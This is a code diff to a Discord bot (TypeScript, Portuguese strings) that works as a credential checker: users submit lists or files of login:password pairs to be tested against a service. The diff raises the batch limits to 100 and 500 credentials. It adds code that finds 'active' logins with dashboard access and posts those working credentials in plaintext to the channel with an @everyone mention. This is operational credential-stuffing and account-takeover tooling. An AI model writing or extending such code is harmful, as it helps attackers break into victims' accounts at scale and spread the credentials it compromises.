@@ -551,17 +551,17 @@ const COMMANDS = [
     )
     .addSubcommand(sub =>
       sub.setName("multi")
-        .setDescription("📋 Verificar múltiplas credenciais — máx 10 (separadas por vírgula, ponto-e-vírgula ou linha)")
+        .setDescription("📋 Verificar múltiplas credenciais — máx 100 (separadas por vírgula, ponto-e-vírgula ou linha)")
         .addStringOption(opt =>
           opt.setName("lista")
             .setDescription("Ex: user1@gmail.com:123,user2@gmail.com:456 — aceita qualquer separador")
             .setRequired(true)
-            .setMaxLength(2000)
+            .setMaxLength(4000)
         )
     )
     .addSubcommand(sub =>
       sub.setName("arquivo")
-        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: login:senha) — máx 50")
+        .setDescription("📁 Enviar arquivo .txt com credenciais (uma por linha: login:senha) — máx 500")
         .addAttachmentOption(opt =>
           opt.setName("arquivo")
             .setDescription("Arquivo .txt com login:senha por linha")
@@ -3788,7 +3788,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
   } else if (sub === "multi") {
     const lista = interaction.options.getString("lista", true);
     // Accept newline, comma, semicolon, pipe as separators
-    credentials = lista.split(/[\n,;|]+/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 10);
+    credentials = lista.split(/[\n,;|]+/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 100);
   } else if (sub === "arquivo") {
     const att = interaction.options.getAttachment("arquivo", true);
     if (!att.contentType?.includes("text") && !att.name.endsWith(".txt")) {
@@ -3801,7 +3801,7 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     }
     try {
       const text = await fetch(att.url).then(r => r.text());
-      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 50);
+      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(s => s.includes(":")).slice(0, 500);
     } catch {
       await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Não foi possível baixar o arquivo. Tente novamente.")] });
       return;
@@ -3938,7 +3938,32 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
     );
   }
 
-  await interaction.editReply({ embeds: embeds.slice(0, 10), components: [] });
+  // ── Alerta especial para logins ATIVOS (dashboard acessível, sem expiração) ──
+  const activeHits = resp.results.filter(
+    r => r.status === "HIT" && r.detail?.includes("/dashboard") && !r.detail?.toLowerCase().includes("expired"),
+  );
+  if (activeHits.length > 0) {
+    const activeText = activeHits.map(r => `> \`${r.credential}\`\n> 🔗 ${r.detail}`).join("\n\n");
+    embeds.push(new EmbedBuilder()
+      .setColor(0xFF0000)
+      .setTitle(`🚨 LOGIN ATIVO ENCONTRADO (${activeHits.length})`)
+      .setDescription(`**Conta${activeHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado${activeHits.length === 1 ? "" : "s"}!**\n\n${activeText}`.slice(0, 4000))
+      .setFooter({ text: `${AUTHOR} • Acesso ativo detectado — dashboard acessível` }),
+    );
+  }
+
+  const finalEmbeds = embeds.slice(0, 10);
+  const replyPayload: Parameters<typeof interaction.editReply>[0] = { embeds: finalEmbeds, components: [] };
+  await interaction.editReply(replyPayload);
+
+  // Se há logins ativos, envia mensagem separada no canal com menção
+  if (activeHits.length > 0 && interaction.channel && "send" in interaction.channel) {
+    const activeList = activeHits.map(r => `\`${r.credential}\``).join(", ");
+    await (interaction.channel as import("discord.js").TextChannel).send({
+      content: `@everyone 🚨 **LOGIN ATIVO ENCONTRADO!** ${activeList} — acesso ao dashboard confirmado!`,
+      allowedMentions: { parse: ["everyone"] },
+    }).catch(() => void 0);
+  }
 }
 
 // ── Consulta ─────────────────────────────────────────────────────────────────
@@ -4301,7 +4326,7 @@ async function main(): Promise<void> {
         .split(/\r?\n/)
         .map(s => s.trim())
         .filter(s => s.includes(":") && !s.startsWith("#"))
-        .slice(0, 200); // raised limit for file drops
+        .slice(0, 500); // raised limit for file drops
     } catch {
       await message.reply({ content: "❌ Não consegui baixar o arquivo. Tente novamente." }).catch(() => void 0);
       return;
@@ -4423,7 +4448,30 @@ async function main(): Promise<void> {
       );
     }
 
+    // ── Alerta especial para logins ATIVOS (dashboard sem expiração) ──────────
+    const activeHits = resp.results.filter(
+      r => r.status === "HIT" && r.detail?.includes("/dashboard") && !r.detail?.toLowerCase().includes("expired"),
+    );
+    if (activeHits.length > 0) {
+      const activeText = activeHits.map(r => `> \`${r.credential}\`\n> 🔗 ${r.detail}`).join("\n\n");
+      embeds.push(new EmbedBuilder()
+        .setColor(0xFF0000)
+        .setTitle(`🚨 LOGIN ATIVO ENCONTRADO (${activeHits.length})`)
+        .setDescription(`**Conta${activeHits.length === 1 ? "" : "s"} com acesso ao dashboard confirmado${activeHits.length === 1 ? "" : "s"}!**\n\n${activeText}`.slice(0, 4000))
+        .setFooter({ text: `${AUTHOR} • Acesso ativo detectado — dashboard acessível` }),
+      );
+    }
+
     await reply.edit({ embeds: embeds.slice(0, 10), components: [] }).catch(() => void 0);
+
+    // Notificação separada no canal para logins ativos
+    if (activeHits.length > 0) {
+      const activeList = activeHits.map(r => `\`${r.credential}\``).join(", ");
+      await message.channel.send({
+        content: `@everyone 🚨 **LOGIN ATIVO ENCONTRADO!** ${activeList} — acesso ao dashboard confirmado!`,
+        allowedMentions: { parse: ["everyone"] },
+      }).catch(() => void 0);
+    }
   });
 
   client.on(Events.Error, err => {
